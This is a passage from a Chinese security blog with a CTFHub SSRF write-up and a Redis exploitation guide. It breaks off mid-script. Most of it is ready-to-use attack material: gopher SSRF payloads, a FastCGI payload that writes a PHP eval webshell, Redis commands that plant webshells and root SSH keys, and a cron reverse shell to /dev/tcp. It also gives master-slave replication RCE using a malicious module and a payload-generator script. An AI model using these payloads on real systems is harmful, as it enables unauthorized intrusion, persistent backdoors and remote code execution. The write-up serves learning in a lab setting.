class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /?url=_&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>同时查看flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;/flag.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;key&quot;</span>&gt;</span><br><span class="line">&lt;!-- Debug: key=<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span>--&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们面前遇到了两个问题 </p><ol><li>直接访问flag.php 但是我们无法突破 127.0.0.1 </li><li>通过 ssrf的127.0.0.1 访问flag.php 可以解决 但是 我们此时使用常规的http 的post传递 传递的 参数是给的index.php 无法达到给flag.php</li></ol><p>**解决:</p><p>gopher协议,以前的旧协议，被http给替代掉了可以发一个post包<br>但是需要编码，两次url 编码<br>第一次编码结束之后需要把%0A 替换为 %0D%0A再进行第二次编码<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240705200628.png" alt="image.png"></p><p>payloads</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gopher%</span><span class="language-bash">3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D01f842aefb9fde52ab9363bc95bbdd5%250D%250A</span></span><br></pre></td></tr></table></figure><blockquote><p>其实既然我在想  他限制了我使用post传递参数我就在想我如果不用post传递参数我使用get传递是不是也可以不用gopher  直接用post</p></blockquote><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240705202113.png" alt="image.png"><br>于是改了一下源码<br><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240705202113.png" alt="image.png"></p><p><a href="http://vul.com/?url=http://127.0.0.1/flag.php?key=d41d8cd98f00b204e9800998ecf8427e">http://vul.com/?url=http://127.0.0.1/flag.php?key=d41d8cd98f00b204e9800998ecf8427e</a><br>事实证明其实我想错了 其实get传递参数还是给了index.php<br>所以还是要用gopher协议</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><blockquote><p>可以看到依旧是跟上一个是一样的都是需要一个 gopher 跟随我们的ssrf 伪造从内网发包访问<br>注意之前提到的我们的上传文件的一些问题</p></blockquote><p>**payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-c55a62e9fd3d11d7.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520challenge-c55a62e9fd3d11d7.sandbox.ctfhub.com%253A10800%250D%250AContent-Length%253A%2520377%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryzAyIHFg5lQfDlecU%250D%250A%250D%250A------WebKitFormBoundaryzAyIHFg5lQfDlecU%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522.htaccess%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253CFilesMatch%2520%25221.jpg%2522%253E%250D%250A%250D%250A%2520%2520SetHandler%2520application/x-httpd-php%250D%250A%250D%250A%253C/FilesMatch%253E%250D%250A%250D%250A%250D%250A------WebKitFormBoundaryzAyIHFg5lQfDlecU%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%250D%250A------WebKitFormBoundaryzAyIHFg5lQfDlecU--%250D%250A</span><br></pre></td></tr></table></figure><h3 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h3><blockquote><p>可以看到我们需要打fastcgi<br>这里需要设置一些详细设置</p></blockquote><table><thead><tr><th>必备条件</th><th><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/top10%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/ssrf/SSRF.md#FastCGI%E5%8D%8F%E8%AE%AE">FastCGI协议</a></th></tr></thead></table><p>直接使用工具开打<a href="https://github.com/tarunkant/Gopherus">gopher</a>  但是需要知道一些php文件的路径才能利用<br>最直接的 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php<br>因此可以生成<br>**paylods</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Give one file name which should be surely present in the server (prefer .php file)                                                          </span><br><span class="line">if you don&#x27;t know press ENTER we have default one:  /var/www/html/index.php</span><br><span class="line">Terminal command to run:  echo &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; /var/www/shell.php</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF:                                 </span><br><span class="line">                                                                      </span><br><span class="line"><span class="meta prompt_">gopher%</span><span class="language-bash">3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH108%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500l%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520%2522%253C%253Fphp%2520eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%253F%253E%2522%2520%253E%2520%2Fvar%2Fwww%2Fshell.php%2527%2529%253Bdie%2528%2527</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>继续使用gopher协议，详解可以关注个人博客<a href="https://k1t0111.github.io/">https://k1t0111.github.io</a><br>其实如果不详细分析的话，我们直接使用gopherus 工具直接打<br>gopherus  –exploit redis  可以直接出payload</p>]]></content>
      
      
      <categories>
          
          <category> 渗透靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis_利用方式大全</title>
      <link href="/2024/07/21/redis-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%A4%A7%E5%85%A8/"/>
      <url>/2024/07/21/redis-%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%A4%A7%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240721160632.png" alt="image.png"></p><p>Redis是一个key-value存储系统。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p><strong>一、漏洞描述</strong></p><p>Redis默认情况下，会绑定在0.0.0.0:6379(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等等，这样将会将Redis服务暴露在公网上，如果在没有设置密码认证(默认为空)的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，攻击者还可以成功将自己的ssh公钥写入目标服务器的&#x2F;root&#x2F;.ssh文件的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务器登录目标服务器。</p><p>漏洞的产生条件有以下两点:</p><p>(1)    Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p><p>(2)    没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p><p>*主要是利用Redis未授权访问，实现像目标主机写入Webshell、SSH公钥，或写入计划任务实现反弹shell。</p><h3 id="常规redis未授权分析"><a href="#常规redis未授权分析" class="headerlink" title="常规redis未授权分析"></a>常规redis未授权分析</h3><blockquote><p>作为一个数据库,redis可以使用对应的客户端程序进行连接,如果存在未授权那么此时我们就可以根据无密码进行连接。</p></blockquote><h5 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h5><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240720134805.png" alt="image.png"></p><p>*相关命令执行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">config get dir #查看redis数据库路径</span><br><span class="line">config set dir /root/redis-2.8.17# #修改靶机Redis数据库路径</span><br><span class="line">其实更多的我感觉是要修改文件的存储路径,web服务的目录之下的文件才能被访问到</span><br><span class="line">config set dbfilename shell.php #生成shell.php文件</span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;#将一句话木马写入文件中</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="string">&quot;\r\n\r\n&quot;</span>是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span></span><br><span class="line">set xxx &quot;\r\n\r\n&lt;?php eval($_POST[whoami]);?&gt;\r\n\r\n&quot;#上传木马可以通过蚁剑连接</span><br><span class="line"><span class="meta prompt_">save#</span><span class="language-bash">保存</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/k1t0111/blog/main/image/20240720134858.png" alt="image.png"></p><p>这是写入webshell,但是在我看来我们更需要把东西放到web目录之下</p><h5 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h5><p>1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</p><p>2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经）</p><p>.还需要具有文件读写增删改查权限（开启web服务器，就可以利用url使用蚁剑进行连接）</p><h4 id="写ssh"><a href="#写ssh" class="headerlink" title="写ssh"></a>写ssh</h4><h6 id="利用前提-1"><a href="#利用前提-1" class="headerlink" title="利用前提"></a>利用前提</h6><p>1.当redis以root身份运行。*(我个人理解是因为.ssh目录在root之中所以必须要root)</p><p>2.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证。</p><p>3.存在&#x2F;root&#x2F;.ssh目录，如果不存在我们可以通过一句话木马连接蚁剑创建目录，不过可能进不去root目录，权限问题可能，或者自己mkdir一个目录毕竟是自己搭建靶场。因为.ssh是隐藏目录可以通过ls -la查看有没有。</p><p>生成公私钥之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">type key.txt | redis-cli.exe -h 192.168.43.141 -x set xxx#如果是linux 将type换成cat</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将公钥作为value插入到数据库中，key随便啥值。</span></span><br><span class="line">redis-cli.exe -h 192.168.43.141 config set dir /root/.ssh</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">修改redis数据库路径</span></span><br><span class="line">redis-cli.exe -h 192.168.43.141 config set dbfilename authorized_keys</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">生成缓冲文件authorized_keys</span></span><br><span class="line">redis-cli.exe -h 192.168.43.141 save</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">保存</span></span><br><span class="line">ssh -i id_rsa root@192.168.43.141</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">连接</span></span><br></pre></td></tr></table></figure><p>其实语句都大差不差,都是切换目录生成对应文件,之后写入对应内容。</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.43.141</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.43.102/8888 0&gt;&amp;1\n\n&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">前面五个星号分别表示 分 时 天 月 周 一般用于具体的定时时间。后面就是执行的命令。\n\n是换行前面已经说过，因为redis会出现乱码，可以通过上传的root文件看到有乱码。</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><table><thead><tr><th>反弹失误情况</th><th><a href="%E5%9F%BA%E7%A1%80/%E7%B3%BB%E7%BB%9F/Linux/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1.md#%E5%8F%8D%E5%BC%B9%E5%A4%B1%E8%B4%A5">反弹失败</a></th></tr></thead></table><h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>Redis 主从复制是一种用于实现数据备份、读写分离和故障恢复的技术。在 Redis 中，可以通过配置一个或多个从服务器（Slave）来复制一个主服务器（Master）的数据。主从复制的基本工作原理如下：</p><ol><li><p><strong>复制过程</strong>：</p><ul><li>主服务器持续地将写操作命令（例如 SET、DEL）发送给所有连接的从服务器。</li><li>从服务器接收到命令后，执行相同的命令，从而使得从服务器的数据和主服务器保持一致。</li></ul></li><li><p><strong>配置步骤</strong>：</p><ul><li>在从服务器的配置文件中配置 <code>slaveof</code> 参数，指定它要复制的主服务器的地址和端口。</li><li>从服务器连接到主服务器后，主服务器会创建一个后台线程来将数据发送给从服务器。</li></ul></li><li><p><strong>用途</strong>：</p><ul><li><strong>数据备份</strong>：从服务器可以用于备份主服务器的数据，以防止主服务器故障时的数据丢失。</li><li><strong>读写分离</strong>：主服务器负责处理写操作，而从服务器可以处理读操作，从而提升整体的读写性能。</li><li><strong>故障恢复</strong>：如果主服务器出现故障，可以将一个从服务器提升为新的主服务器，从而保证系统的高可用性。</li></ul></li><li><p><strong>配置选项</strong>：</p><ul><li>可以配置从服务器只接收部分数据库的数据（<code>replica-serve-stale-data</code>）。</li><li>可以配置从服务器成为主服务器时是否清除原有数据（<code>replica-read-only</code>）。</li></ul></li></ol><h5 id="Redis主从复制利用原理"><a href="#Redis主从复制利用原理" class="headerlink" title="Redis主从复制利用原理"></a>Redis主从复制利用原理</h5><p>首先，我们通过一个简单的测试，来熟悉一下slave和master的握手协议过程：</p><p>*1、监听本地1234端口</p><p>nc -lvvp 1234</p><p>*2、将Redis服务器设置为从节点(slave)</p><p>slaveof 127.0.0.1 1234</p><p>*3、使用nc模拟Redis主服务器，进行模拟Redis主从交互过程（红色部分为slave发送的命令）：<img src="https://img2020.cnblogs.com/blog/894761/202006/894761-20200610224805141-1328077677.png"></p><p>以上，通过nc进行模拟Redis主从复制的交互过程，同理，如果构建模拟一个Redis服务器，利用Redis主从复制的机制，那么就可以通过FULLRESYNC将任意文件同步到从节点</p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p><p>通过脚本实现一键自动化getshell：</p><p>1、生成恶意.so文件，下载RedisModules-ExecuteCommand使用make编译即可生成。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">cd RedisModules-ExecuteCommand/</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>2、攻击端执行： python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line">cd redis-rce/</span><br><span class="line">cp ../RedisModules-ExecuteCommand/src/module.so ./</span><br><span class="line">pip install -r requirements.txt </span><br><span class="line">python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so</span><br></pre></td></tr></table></figure><h4 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a><a href="https://github.com/Ridter/redis-rce">工具地址</a></h4><h2 id="ssrf-攻击redis"><a href="#ssrf-攻击redis" class="headerlink" title="ssrf 攻击redis"></a>ssrf 攻击redis</h2><table><thead><tr><th>联合ssrf 进行攻击</th><th><a href="%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/top10%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/ssrf/SSRF.md#Redis%E5%8D%8F%E8%AE%AE">Redis协议</a></th><th></th></tr></thead><tbody><tr><td><a href="https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3">https://xie.infoq.cn/article/f3dc94425d5b586d34e1beae3</a></td><td></td><td></td></tr><tr><td>ssrf 实践训练</td><td><a href="%E9%9D%B6%E6%9C%BA/CTFHUB/%E5%9F%BA%E7%A1%80%E8%AE%AD%E7%BB%83/ssrf.md">ssrf</a></td><td></td></tr><tr><td>————-</td><td>————————————</td><td></td></tr></tbody></table><h5 id="首先了解一下resp协议"><a href="#首先了解一下resp协议" class="headerlink" title="首先了解一下resp协议"></a>首先了解一下resp协议</h5><blockquote><p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信</p><p>RESP 协议是在 Redis 1.2 中引入的，但它成为了与 Redis 2.0 中的 Redis 服务器通信的标准方式</p><p>RESP 实际上是一个支持以下数据类型的序列化协议：</p><ul><li><p>简单字符串</p></li><li><p>错误</p></li><li><p>整数</p></li><li><p>批量字符串</p></li><li><p>数组</p></li></ul><p>RESP 在 Redis 中用作请求 - 响应协议的方式如下：</p><ol><li><p>客户端将<em>命令</em>作为<code>Bulk Strings</code>的 RESP 数组发送到 Redis 服务器</p></li><li><p>服务器根据命令实现回复一种 RESP 类型</p></li></ol><p>在 RESP 中，某些数据的类型取决于第一个字节：</p><ul><li><p>对于客户端请求<code>Simple Strings</code>，回复的第一个字节是<code>+</code>  </p></li><li><p>对于客户端请求<code>error</code>，回复的第一个字节是<code>-</code>  </p></li><li><p>对于客户端请求<code>Integer</code>，回复的第一个字节是<code>:</code>  </p></li><li><p>对于客户端请求<code>Bulk Strings</code>，回复的第一个字节是<code>$</code>  </p></li><li><p>对于客户端请求<code>array</code>，回复的第一个字节是<code>*</code></p></li></ul><p>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。</p><p>在 RESP 中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p></blockquote><p>可以看到客户端将命令发送到 Redis 服务器的流程为</p><ul><li><p>客户端向 Redis 服务器发送一个仅由 Bulk Strings 组成的 RESP Arrays</p></li><li><p>Redis 服务器发送任何有效 RESP 数据类型作为回复返回给客户端</p></li></ul><p>Bulk Strings 用于表示长度最大为 512 MB 的单个二进制安全字符串，按以下方式编码：</p><ul><li><p><code>$字节数</code>：一个<code>$</code>后跟组成字符串的字节数，由 CRLF 终止。</p></li><li><p>字符串数据</p></li><li><p>CRLF</p></li></ul><p>字符串<code>f4ke</code>的编码如下：<code>$4\r\nf4ke\r\n</code>，如下图格式</p><p> RESP Arrays 使用以下格式发送:</p><ul><li><p><code>*元素数</code>：<code>*</code>字符作为第一个字节，后跟数组中的元素数，后跟 CRLF</p></li><li><p>数组中的每个元素都附加 RESP 类型</p></li><li><p>每一个<code>*number</code>代表每一行命令，number 代表每行命令中数组中的元素个数</p></li><li><p>图中的<code>*3</code>，代表<code>config get dbfilename</code>这行命令的 3 个元素</p></li><li><p><code>$number</code>代表每个元素的长度</p></li><li><p><code>$6</code>，代表<code>config</code>长度</p></li></ul><p>可以看到一个协议内容,严格根据协议的规定来写的,因此如果说我们想要利用gopher协议的话,我们就需要在gopher协议之后利用resp协议的内容。</p><h6 id="有密码验证"><a href="#有密码验证" class="headerlink" title="有密码验证"></a>有密码验证</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4</span></span><br><span class="line">AUTH</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">123123</span><br></pre></td></tr></table></figure><p>即使是有密码，也只是每一个命令都加一个验证的部分罢了</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>根据我们的协议内容，我们正常的去连接redis然后执行的一些命令，我们需要写成resp协议的方式<br>例如:我们写webshell的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#x27;&lt;?php eval($_POST\[\\&quot;f4ke\\&quot;\]);?&gt;&#x27;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename 5he1l.php</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>我们需要转化成resp协议格式再加上gopher协议头 例如下图可以直接执行这个命令<br><a href="http://xx.xx.xx.xx:8000/ssrf.php?url=gopher://127.0.0.1:6788/_*1">http://xx.xx.xx.xx:8000/ssrf.php?url=gopher://127.0.0.1:6788/_*1</a><br>$8<br>flushall<br>*3<br>$3<br>set<br>$1<br>1<br>$33</p><?php eval($_POST["f4ke"]);?><p>*4<br>$6<br>config<br>$3<br>set<br>$3<br>dir<br>$13<br>&#x2F;var&#x2F;www&#x2F;html<br>*4<br>$6<br>config<br>$3<br>set<br>$10<br>dbfilename<br>$9<br>5he1l.php<br>*1<br>$4<br>save<br>*1<br>$4<br>quit</p><h4 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h4><ol><li>gopher工具可以直接生成payload</li><li>ssrf-redis 脚本(将命令生成resp协议格式配合gopher协议)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Time:2024/7/21  </span></span><br><span class="line"><span class="comment"># Author:K1t0  </span></span><br><span class="line"><span class="keyword">import</span> urllib.parse  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 函数功能: 将redis命令 编写成resp协议形式  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redis_format</span>(<span class="params">arr</span>):  </span><br><span class="line">    CRLF=<span class="string">&quot;\r\n&quot;</span> <span class="comment"># 这是redis协议的规定  </span></span><br><span class="line">    redis_arr=arr.split(<span class="string">&quot; &quot;</span>)  </span><br><span class="line">    cmd=<span class="string">&quot;&quot;</span>  </span><br><span class="line">    cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))  </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:  </span><br><span class="line">    cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&quot;</span>,<span class="string">&quot; &quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> cmd  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">  </span><br><span class="line">    protocol = <span class="string">&quot;gopher://&quot;</span>  </span><br><span class="line">    ip = <span class="string">&quot;127.0.0.1&quot;</span>  </span><br><span class="line">    port = <span class="string">&quot;6379&quot;</span>  </span><br><span class="line">    shell = <span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;k1t0\&quot;]);?&gt;\n\n&quot;</span>  </span><br><span class="line">    filename = <span class="string">&quot;shell.php&quot;</span>  </span><br><span class="line">    path = <span class="string">&quot;/var/www/html&quot;</span>  </span><br><span class="line">    passwd = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    cmd = 